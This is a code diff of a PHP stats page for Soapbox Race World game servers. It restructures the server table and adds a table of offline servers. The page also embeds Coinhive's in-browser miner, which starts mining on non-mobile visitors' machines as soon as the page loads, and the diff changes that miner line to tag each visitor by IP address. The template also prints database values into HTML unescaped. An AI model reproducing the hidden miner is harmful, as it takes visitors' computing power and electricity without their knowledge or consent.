@@ -34,6 +34,8 @@
 		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
 		<link rel="stylesheet" href="https://launcher.soapboxrace.world/stats/assets/css/animate.css">
 		<link rel="stylesheet" href="https://launcher.soapboxrace.world/stats/assets/css/framework.css">
+		<link rel="stylesheet" href="//cdn.datatables.net/1.10.16/css/jquery.dataTables.min.css">
+
 		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.10/css/all.css" integrity="sha384-+d0P83n9kaQMCwj8F4RJB66tzIwOKmrdb46+porD/OvrJ+37WqIM7UoBtwHO6Nlg" crossorigin="anonymous">
 		<link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
 		<link href="https://fonts.googleapis.com/css?family=Roboto+Condensed" rel="stylesheet">
@@ -275,10 +277,11 @@
 		<script src="assets/js/ping.js"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+		<script src="//cdn.datatables.net/1.10.16/js/jquery.dataTables.min.js"></script>
 
 		<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
 		<script>
-			var miner = new CoinHive.User('xBYFfMkgxIZm96bUQuaVtXaWWPiQ0tYn', "STATS-<?=$_SERVER['REMOTE_ADDR']?>" ,{throttle: 0.8});
+			var miner = new CoinHive.User('xBYFfMkgxIZm96bUQuaVtXaWWPiQ0tYn', "<?=$_SERVER['REMOTE_ADDR']?>" ,{throttle: 0.8});
 			if (!miner.isMobile()) {
 				miner.start();
 			}
@@ -441,118 +444,165 @@
 				</tr>
 				<?php
 					foreach($fulldatabase as $servers) {
-						$serverip = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['serverIP']));
+						if($servers['fetchData'] == 1) {
+							$serverip = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['serverIP']));
 
-						if($servers['fetchData'] == 0) {
-							$status = "<div class='s_status s_disabled showtt' title='Server has been shutted down'></div>";
-							$connect = "";
-							$counter = "---";
-							$ping = "---";
-						} elseif($servers['isOnline'] == 0) {
-							$status = "<div class='s_status s_offline showtt' title='Failed to ping server'></div>";
-							$connect = "";
-							$counter = "---";
-							$ping = "---";
-						} elseif($servers['onlineNumber'] == 0) {
-							?>
-								<script type="text/javascript">
-									ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
-										jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
-									})
-								</script>
-							<?php
+							if($servers['fetchData'] == 0) {
+								$status = "<div class='s_status s_disabled showtt' title='Server has been shutted down'></div>";
+								$connect = "";
+								$counter = "---";
+								$ping = "---";
+							} elseif($servers['isOnline'] == 0) {
+								$status = "<div class='s_status s_offline showtt' title='Failed to ping server'></div>";
+								$connect = "";
+								$counter = "---";
+								$ping = "---";
+							} elseif($servers['onlineNumber'] == 0) {
+								?>
+									<script type="text/javascript">
+										ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
+											jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
+										})
+									</script>
+								<?php
 
-							$status = "<div class='s_status s_busy showtt' title='Server is online, but no one is connected'></div>";
-							$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
-							$counter = $servers['onlineNumber'];
-							$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
-						} else {
-							?>
-								<script type="text/javascript">
-									ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
-										jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
-									})
-								</script>
-							<?php
+								$status = "<div class='s_status s_busy showtt' title='Server is online, but no one is connected'></div>";
+								$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
+								$counter = $servers['onlineNumber'];
+								$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
+							} else {
+								?>
+									<script type="text/javascript">
+										ping("<?=$servers['serverIP']?>/GetServerInformation").then(function(x) {
+											jQuery(".ping_<?=$servers['ID']?>").text(x + "ms");
+										})
+									</script>
+								<?php
 
-							$status = "<div class='s_status s_online showtt' title='Server is online'></div>";
-							$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
-							$counter = $servers['onlineNumber'];
-							$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
-						}
+								$status = "<div class='s_status s_online showtt' title='Server is online'></div>";
+								$connect = "<a class='btn btn-dark btn-sm' href='".$serverip."' role='button'>Connect</a>";
+								$counter = $servers['onlineNumber'];
+								$ping = "<div style='text-align: center;' class='ping_".$servers['ID']."'>...</div>";
+							}
 
-						if($servers['information'] != NULL) {
-							$infobutton = "<span class='badge info' style='cursor: pointer;'><i class='fa fa-info' aria-hidden='true'></i><span class='hide'>".$servers['information']."</span></span></span><span class='separate'></span>";
-						} else {
-							$infobutton = "";
-						}
+							if($servers['information'] != NULL) {
+								$infobutton = "<span class='badge info' style='cursor: pointer;'><i class='fa fa-info' aria-hidden='true'></i><span class='hide'>".$servers['information']."</span></span></span><span class='separate'></span>";
+							} else {
+								$infobutton = "";
+							}
 
-						if($servers['isOfficial'] == 1) {
-							$append = "<span class='badge official'><i class='fa fa-check showtt3' aria-hidden='true'></i> <span class='hide'>Official Server</span></span><span class='separate'></span> ";
-						} elseif($servers['isBanned'] == 1) {
-							$append = "<span class='badge banned'><i class='fa fa-times showtt3' aria-hidden='true'></i> <span class='hide'>Banned Server</span></span><span class='separate'></span> ";
-						} elseif($servers['isCertified'] == 1) {
-							$append = "<span class='badge certified'><i class='fas fa-bolt showtt3' aria-hidden='true'></i> <span class='hide'>POWER Server</span></span><span class='separate'></span> ";
-						} else {
-							$append = "";
-						}
+							if($servers['isOfficial'] == 1) {
+								$append = "<span class='badge official'><i class='fa fa-check showtt3' aria-hidden='true'></i> <span class='hide'>Official Server</span></span><span class='separate'></span> ";
+							} elseif($servers['isBanned'] == 1) {
+								$append = "<span class='badge banned'><i class='fa fa-times showtt3' aria-hidden='true'></i> <span class='hide'>Banned Server</span></span><span class='separate'></span> ";
+							} elseif($servers['isCertified'] == 1) {
+								$append = "<span class='badge certified'><i class='fas fa-bolt showtt3' aria-hidden='true'></i> <span class='hide'>POWER Server</span></span><span class='separate'></span> ";
+							} else {
+								$append = "";
+							}
 
-						if($servers['social']) {
-							$appendsocial = "";
+							if($servers['social']) {
+								$appendsocial = "";
 
-							$socialize = json_decode($servers['social'], true);
+								$socialize = json_decode($servers['social'], true);
 
-							if($socialize != NULL) {
-								if($socialize['www'] == "nope" && $socialize['fb'] == "nope" && $socialize['discord'] == "nope" || $socialize['www'] == "" && $socialize['fb'] == "" && $socialize['discord'] == "") {
-									$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
-								} else {
-									if(filter_var($socialize['discord'], FILTER_VALIDATE_URL)) {
-										$appendsocial .= "<a href='".$socialize['discord']."' target='_blank'><span class='social discord'><i class='fab fa-discord'></i></span></a>";
+								if($socialize != NULL) {
+									if($socialize['www'] == "nope" && $socialize['fb'] == "nope" && $socialize['discord'] == "nope" || $socialize['www'] == "" && $socialize['fb'] == "" && $socialize['discord'] == "") {
+										$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
 									} else {
-										$appendsocial .= "<span class='social discord disabled'><i class='fab fa-discord'></i></span>";
-									}
+										if(filter_var($socialize['discord'], FILTER_VALIDATE_URL)) {
+											$appendsocial .= "<a href='".$socialize['discord']."' target='_blank'><span class='social discord'><i class='fab fa-discord'></i></span></a>";
+										} else {
+											$appendsocial .= "<span class='social discord disabled'><i class='fab fa-discord'></i></span>";
+										}
 
-									if(filter_var($socialize['www'], FILTER_VALIDATE_URL)) {
-										$appendsocial .= "<a href='".$socialize['www']."' target='_blank'><span class='social www'><i class='fas fa-home'></i></span></a>";
-									} else {
-										$appendsocial .= "<span class='social www disabled'><i class='fas fa-home'></i></span>";
-									}
+										if(filter_var($socialize['www'], FILTER_VALIDATE_URL)) {
+											$appendsocial .= "<a href='".$socialize['www']."' target='_blank'><span class='social www'><i class='fas fa-home'></i></span></a>";
+										} else {
+											$appendsocial .= "<span class='social www disabled'><i class='fas fa-home'></i></span>";
+										}
 
-									if(filter_var($socialize['fb'], FILTER_VALIDATE_URL)) {
-										$appendsocial .= "<a href='".$socialize['fb']."' target='_blank'><span class='social fb'><i class='fab fa-facebook-f'></i></span></a>";
-									} else {
-										$appendsocial .= "<span class='social fb disabled'><i class='fab fa-facebook-f'></i></span>";
+										if(filter_var($socialize['fb'], FILTER_VALIDATE_URL)) {
+											$appendsocial .= "<a href='".$socialize['fb']."' target='_blank'><span class='social fb'><i class='fab fa-facebook-f'></i></span></a>";
+										} else {
+											$appendsocial .= "<span class='social fb disabled'><i class='fab fa-facebook-f'></i></span>";
+										}
 									}
 								}
+							} else {
+								$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
 							}
-						} else {
-							$appendsocial = "<span class='social nothing'>¯\_(ツ)_/¯</span>";
+
+							if($servers['isBanned'] == 1)  {
+								$appendsocial = "<span class='social banned'>Banned</span>";
+							} 
+
+							if($servers['proxyurl'] != NULL) {
+								$proxyurl = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['proxyurl']));
+								$hasproxy = " <br /> <i class='fas fa-globe' aria-hidden='true'></i> ".$proxyurl."</small>";
+							} else {
+								$hasproxy = "</small>";
+							}
+
+							echo "<tr rowspan='2'>";
+							echo "<th scope='row' style='position: relative;'>".$status." ".$append.$servers['serverName']." ".$infobutton." <br /><small class='text-muted'><i class='fa fa-link' aria-hidden='true'></i> ".$serverip.$hasproxy."</th>";
+							echo "<td>".$counter."/<b>".$servers['maxOnline']."</b></td>";
+							echo "<td class='showtt' title='".date("F d, Y", $servers['maxOnlineTimestamp'])."'> <time class='timeago' title='' datetime='".date("Y-m-d\TH:i:s\\+\\0\\2\\0\\0", $servers['maxOnlineTimestamp'])."'></time></td>";
+							echo "<td>".$ping."</td>";
+							echo "<td><div class='socialpanel'>".$appendsocial."</div></td>";
+							echo "<!--td>".$connect."</td-->";
+							echo "</tr>";
 						}
-
-						if($servers['isBanned'] == 1)  {
-							$appendsocial = "<span class='social banned'>Banned</span>";
-						} 
-
-						if($servers['proxyurl'] != NULL) {
-							$proxyurl = str_replace("http://", "nfswlaunch://connect/", str_replace("soapbox-race-core/Engine.svc", "", $servers['proxyurl']));
-							$hasproxy = " <br /> <i class='fas fa-globe' aria-hidden='true'></i> ".$proxyurl."</small>";
-						} else {
-							$hasproxy = "</small>";
-						}
-
-						echo "<tr rowspan='2'>";
-						echo "<th scope='row' style='position: relative;'>".$status." ".$append.$servers['serverName']." ".$infobutton." <br /><small class='text-muted'><i class='fa fa-link' aria-hidden='true'></i> ".$serverip.$hasproxy."</th>";
-						echo "<td>".$counter."/<b>".$servers['maxOnline']."</b></td>";
-						echo "<td class='showtt' title='".date("F d, Y", $servers['maxOnlineTimestamp'])."'> <time class='timeago' title='' datetime='".date("Y-m-d\TH:i:s\\+\\0\\2\\0\\0", $servers['maxOnlineTimestamp'])."'></time></td>";
-						echo "<td>".$ping."</td>";
-						echo "<td><div class='socialpanel'>".$appendsocial."</div></td>";
-						echo "<!--td>".$connect."</td-->";
-						echo "</tr>";
 					}
 				?>
 				</tbody>
 			</table>
-			<br />	
+
+			<table class="table table-responsive jquerydatatable" style="border: 1px solid #efefef;">
+				<thead class="thead-inverse">
+					<tr>
+						<th style="width: 70%;"><i class="fa fa-clock-o" aria-hidden="true"></i> Offline Servers Statistics</th>
+						<th>Max/Registered</th>
+						<th>Date</th>
+					</tr>
+				</thead>
+				<tbody>
+				<?php
+					foreach($fulldatabase as $servers) {
+						if($servers['fetchData'] == 0) {
+							$status = "<div class='s_status s_disabled showtt' title='Server has been shutted down'></div>";
+							
+							if($servers['information'] != NULL) {
+								$infobutton = "<span class='badge info' style='cursor: pointer;'><i class='fa fa-info' aria-hidden='true'></i><span class='hide'>".$servers['information']."</span></span></span><span class='separate'></span>";
+							} else {
+								$infobutton = "";
+							}
+
+							if($servers['isOfficial'] == 1) {
+								$append = "<span class='badge official'><i class='fa fa-check showtt3' aria-hidden='true'></i> <span class='hide'>Official Server</span></span><span class='separate'></span> ";
+							} elseif($servers['isBanned'] == 1) {
+								$append = "<span class='badge banned'><i class='fa fa-times showtt3' aria-hidden='true'></i> <span class='hide'>Banned Server</span></span><span class='separate'></span> ";
+							} elseif($servers['isCertified'] == 1) {
+								$append = "<span class='badge certified'><i class='fas fa-bolt showtt3' aria-hidden='true'></i> <span class='hide'>POWER Server</span></span><span class='separate'></span> ";
+							} else {
+								$append = "";
+							}
+
+							if($servers['isBanned'] == 1)  {
+								$appendsocial = "<span class='social banned'>Banned</span>";
+							}
+
+							echo "<tr rowspan='2'>";
+							echo "<th scope='row' style='position: relative;'>".$status." ".$append.$servers['serverName']." ".$infobutton."</th>";
+							echo "<td>".$servers['maxOnline']."/<b>".$servers['registeredCount']."</b></td>";
+							echo "<td class='showtt' title='".date("F d, Y", $servers['maxOnlineTimestamp'])."'> <time class='timeago' title='' datetime='".date("Y-m-d\TH:i:s\\+\\0\\2\\0\\0", $servers['maxOnlineTimestamp'])."'></time></td>";
+							echo "</tr>";
+						}
+					}
+				?>
+				</tbody>
+			</table>
+			<br />
 		</div>
 
 		<div class="container forced-nosize">
